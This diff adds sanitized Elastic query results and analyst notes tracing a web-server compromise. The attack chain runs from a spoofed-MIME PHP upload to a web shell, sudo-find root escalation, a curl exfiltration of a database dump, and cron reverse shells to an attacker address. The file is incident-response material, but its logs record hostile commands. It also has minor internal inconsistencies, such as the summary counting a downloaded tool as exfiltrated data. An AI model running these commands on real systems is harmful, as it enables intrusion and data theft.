@@ -1,0 +1,190 @@
+# Elastic KQL Query Results — Sanitized
+# Host: WEB-SERVER-01
+# Index: filebeat-* (Apache logs), auditbeat-* (auditd), system-*
+# Window: 2024-05-21 14:20:00 UTC to 2024-05-21 14:55:00 UTC
+# -----------------------------------------------------------------------
+
+
+# ================================================================
+# QUERY 1: Find all requests to the web shell
+# ================================================================
+# KQL:
+#   http.request.url.path: "/uploads/img_cache/thumb_resize.php"
+# ----------------------------------------------------------------
+
+HITS: 16
+INDEX: filebeat-apache-2024.05.21
+
+_timestamp                   source.ip      http.method  url.path                                    status  bytes  user_agent
+---------------------------  -------------  -----------  ------------------------------------------  ------  -----  ------------------
+2024-05-21T14:32:07.441Z     203.0.113.88   POST         /uploads/img_cache/thumb_resize.php         200     9      curl/7.88.1
+2024-05-21T14:32:19.214Z     203.0.113.88   POST         /uploads/img_cache/thumb_resize.php         200     38     curl/7.88.1
+2024-05-21T14:32:31.882Z     203.0.113.88   POST         /uploads/img_cache/thumb_resize.php         200     67     curl/7.88.1
+2024-05-21T14:33:02.119Z     203.0.113.88   POST         /uploads/img_cache/thumb_resize.php         200     412    curl/7.88.1
+2024-05-21T14:34:11.774Z     203.0.113.88   POST         /uploads/img_cache/thumb_resize.php         200     2847   curl/7.88.1
+2024-05-21T14:35:47.002Z     203.0.113.88   POST         /uploads/img_cache/thumb_resize.php         200     1203   curl/7.88.1
+2024-05-21T14:38:02.009Z     203.0.113.88   POST         /uploads/img_cache/thumb_resize.php         200     43     curl/7.88.1
+2024-05-21T14:38:19.441Z     203.0.113.88   POST         /uploads/img_cache/thumb_resize.php         200     18921  curl/7.88.1
+2024-05-21T14:43:07.882Z     203.0.113.88   POST         /uploads/img_cache/thumb_resize.php         200     24     curl/7.88.1
+2024-05-21T14:44:02.119Z     203.0.113.88   POST         /uploads/img_cache/thumb_resize.php         200     1122   curl/7.88.1
+2024-05-21T14:44:31.774Z     203.0.113.88   POST         /uploads/img_cache/thumb_resize.php         200     67     curl/7.88.1
+2024-05-21T14:45:18.002Z     203.0.113.88   POST         /uploads/img_cache/thumb_resize.php         200     67     curl/7.88.1
+2024-05-21T14:46:03.009Z     203.0.113.88   POST         /uploads/img_cache/thumb_resize.php         200     31     curl/7.88.1
+2024-05-21T14:47:22.441Z     203.0.113.88   POST         /uploads/img_cache/thumb_resize.php         200     19     curl/7.88.1
+2024-05-21T14:48:55.882Z     203.0.113.88   POST         /uploads/img_cache/thumb_resize.php         200     12     curl/7.88.1
+2024-05-21T14:51:44.119Z     203.0.113.88   POST         /uploads/img_cache/thumb_resize.php         200     28     curl/7.88.1
+
+ANALYST NOTE: All 16 hits are POST requests from 203.0.113.88 using curl — no browser.
+              Zero GET requests to this path — confirms it was never a rendered page.
+
+
+# ================================================================
+# QUERY 2: apache2 spawning shell processes (auditbeat)
+# ================================================================
+# KQL:
+#   process.parent.name: "apache2"
+#   AND process.name: ("bash" OR "sh" OR "python3" OR "wget" OR "curl" OR "find")
+#   AND @timestamp >= "2024-05-21T14:28:00"
+# ----------------------------------------------------------------
+
+HITS: 11
+INDEX: auditbeat-2024.05.21
+
+_timestamp                   process.pid  process.name  process.args                                   process.parent.name  user.name
+---------------------------  -----------  ------------  ---------------------------------------------  -------------------  ----------
+2024-05-21T14:32:07.441Z     4201         sh            ["-c", "whoami"]                               apache2              www-data
+2024-05-21T14:32:19.214Z     4211         sh            ["-c", "id"]                                   apache2              www-data
+2024-05-21T14:32:31.882Z     4221         sh            ["-c", "uname -a"]                             apache2              www-data
+2024-05-21T14:33:02.119Z     4231         sh            ["-c", "ls /var/www/html"]                     apache2              www-data
+2024-05-21T14:34:11.774Z     4241         sh            ["-c", "cat /etc/passwd"]                      apache2              www-data
+2024-05-21T14:35:47.002Z     4263         sh            ["-c", "find / -perm -u=s -type f"]            apache2              www-data
+2024-05-21T14:38:02.009Z     4289         sh            ["-c", "wget http://203.0.113.88:9090/..."]    apache2              www-data
+2024-05-21T14:38:19.441Z     4301         bash          ["/tmp/.cache/lp.sh"]                          apache2              www-data
+2024-05-21T14:41:03.002Z     4381         sudo          ["find", ".", "-exec", "/bin/bash"]             apache2              www-data
+2024-05-21T14:43:07.882Z     4401         sudo          ["find", ".", "-exec", "/bin/bash", "-quit"]   apache2              www-data
+2024-05-21T14:43:09.009Z     4402         bash          []                                             sudo                 root
+# ⚠️ Last entry: bash spawned by sudo, running as ROOT — privilege escalation confirmed
+
+ANALYST NOTE: apache2 spawning sh/bash is a critical detection rule.
+              In a normal web server, apache2 should NEVER spawn a shell.
+
+
+# ================================================================
+# QUERY 3: All processes run as root spawned from web context
+# ================================================================
+# KQL:
+#   user.name: "root"
+#   AND process.parent.pid: 4402
+#   AND @timestamp >= "2024-05-21T14:43:00"
+# ----------------------------------------------------------------
+
+HITS: 8
+INDEX: auditbeat-2024.05.21
+
+_timestamp                   process.pid  process.name   process.args                                  user.name
+---------------------------  -----------  -------------  --------------------------------------------  ----------
+2024-05-21T14:43:15.441Z     4408         cat            ["/etc/shadow"]                               root
+2024-05-21T14:44:02.119Z     4419         cat            ["/var/www/html/config.php"]                  root
+2024-05-21T14:44:31.774Z     4431         mysql          ["-u", "webappuser", "-p[REDACTED]", "..."]   root
+2024-05-21T14:45:18.002Z     4441         mysqldump      ["-u", "webappuser", "-p[REDACTED]", "..."]   root
+2024-05-21T14:46:03.009Z     4458         curl           ["-X", "POST", "-F", "file=@/tmp/..."]        root
+2024-05-21T14:47:22.441Z     4471         crontab        ["-e"]                                        root
+2024-05-21T14:48:55.882Z     4491         rm             ["/root/.bash_history"]                       root
+2024-05-21T14:53:22.119Z     4501         history        ["-c"]                                        root
+
+ANALYST NOTE: All 8 processes are post-escalation root activity.
+              curl exfiltrating db.sql and crontab modification are the most critical.
+
+
+# ================================================================
+# QUERY 4: Upload endpoint — filter for blocked vs successful
+# ================================================================
+# KQL:
+#   http.request.url.path: "/upload.php"
+#   AND source.ip: "203.0.113.88"
+# ----------------------------------------------------------------
+
+HITS: 3
+INDEX: filebeat-apache-2024.05.21
+
+_timestamp                   source.ip     http.method  url.full                                     status  http.request.mime_type        filename
+---------------------------  ------------  -----------  -------------------------------------------  ------  ----------------------------  --------------------
+2024-05-21T14:25:17.119Z     203.0.113.88  POST         /upload.php?action=profile_img               403     application/x-php             shell.php
+2024-05-21T14:25:49.441Z     203.0.113.88  POST         /upload.php?action=profile_img               403     application/x-php             shell.php5
+2024-05-21T14:28:03.882Z     203.0.113.88  POST         /upload.php?action=profile_img               200     image/jpeg  ← SPOOFED          thumb_resize.php
+# ⚠️ Third attempt succeeded: Content-Type header said image/jpeg but file was .php
+# The upload.php script trusted the Content-Type header without validating file content
+
+
+# ================================================================
+# QUERY 5: File creation in web root (auditbeat file integrity)
+# ================================================================
+# KQL:
+#   event.action: "created"
+#   AND file.path: "/var/www/html/*"
+#   AND @timestamp >= "2024-05-21T14:20:00"
+# ----------------------------------------------------------------
+
+HITS: 2
+INDEX: auditbeat-2024.05.21
+
+_timestamp                   event.action  file.path                                                    file.size  process.name  user.name
+---------------------------  ------------  -----------------------------------------------------------  ---------  ------------  ----------
+2024-05-21T14:28:03.882Z     created       /var/www/html/uploads/img_cache/thumb_resize.php             4827       apache2       www-data
+2024-05-21T14:28:03.882Z     created       /var/www/html/uploads/img_cache/thumb_resize.php.jpg         0          apache2       www-data
+# Note: thumb_resize.php.jpg is the decoy thumbnail — empty file created as cover
+
+
+# ================================================================
+# QUERY 6: Network connections from WEB-SERVER-01 to attacker IP
+# ================================================================
+# KQL:
+#   destination.ip: "203.0.113.88"
+#   AND host.name: "WEB-SERVER-01"
+# ----------------------------------------------------------------
+
+HITS: 4
+INDEX: auditbeat-network-2024.05.21
+
+_timestamp                   source.ip      source.port  dest.ip         dest.port  process.name  bytes_sent  event.action
+---------------------------  -------------  -----------  --------------  ---------  ------------  ----------  ---------------
+2024-05-21T14:38:04.119Z     10.10.5.25     49231        203.0.113.88    9090       wget          156288      network_flow
+# ⚠️ wget downloading LinPEAS (152KB)
+2024-05-21T14:46:05.441Z     10.10.5.25     49388        203.0.113.88    9090       curl          12582912    network_flow
+# ⚠️ curl exfiltrating db.sql (~12MB database dump)
+2024-05-21T14:48:01.009Z     10.10.5.25     49401        203.0.113.88    4444       bash          312         network_flow
+# ⚠️ Reverse shell — cron job fired, bash connecting to port 4444
+2024-05-21T14:49:01.882Z     10.10.5.25     49412        203.0.113.88    4444       bash          312         network_flow
+# ⚠️ Second reverse shell execution (cron repeating every minute)
+
+
+# ================================================================
+# SUMMARY DASHBOARD (Elastic aggregation output)
+# ================================================================
+
+Metric                                        Count / Value
+--------------------------------------------  ---------------------------
+Total events from 203.0.113.88                19
+Web shell POST requests                       16
+Upload bypass attempts                        3  (2 fail / 1 success)
+apache2 shell child processes                 11
+Root processes spawned from web context       8
+Outbound connections to 203.0.113.88          4
+Total data exfiltrated                        ~12.7 MB  (LinPEAS + db.sql)
+Files created in /var/www/html                2
+Files created in /tmp/.cache/                 3  (lp.sh, db.sql, svcupdate)
+Cron job modifications                        1
+Anti-forensic events                          2  (history -c, rm .bash_history)
+First malicious event                         2024-05-21 14:20:11 UTC
+Last malicious event                          2024-05-21 14:51:44 UTC
+Total attack duration                         31 minutes 33 seconds
+
+
+# -----------------------------------------------------------------------
+# ANALYST NOTES:
+# - Query 2 (apache2 spawning shells) is the highest-value detection rule
+# - Query 4 reveals the MIME bypass — critical for remediation guidance
+# - Query 6 confirms exfiltration volume (~12MB) — data breach threshold likely met
+# - Recommend creating Elastic alert: process.parent.name:apache2 AND
+#   process.name:(bash OR sh OR python*) → severity HIGH, auto-notify SOC
+# -----------------------------------------------------------------------
